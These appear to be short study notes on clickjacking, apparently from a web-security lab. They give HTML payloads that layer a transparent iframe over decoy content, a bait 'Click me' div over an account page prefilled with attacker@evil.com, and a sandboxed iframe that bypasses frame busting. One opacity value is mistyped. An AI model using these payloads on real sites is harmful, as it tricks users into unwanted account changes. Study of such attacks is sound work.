```HTML
<head>
	<style>
		\#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		\#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			pointer-events: none;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```

```HTML
<style>
iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 1000px;
    height: 700px;
    opacity: 00001;
    z-index: 1;
}

\#bait {
    position: absolute;
    top: 505px;  
    left: 60px;
    z-index: 2;
    font-size: 20px;
    background: transparent;
    pointer-events: none;
}
</style>

<div id="bait">Click me</div>

<iframe src="https://out-token.web-security-academy.net/my-account?email=attacker@evil.com"></iframe>
```

A common client-side protection enacted through the web browser is to use **frame busting** or frame breaking scripts. These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript. Frame Buster can be avoided by using this

```HTML
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```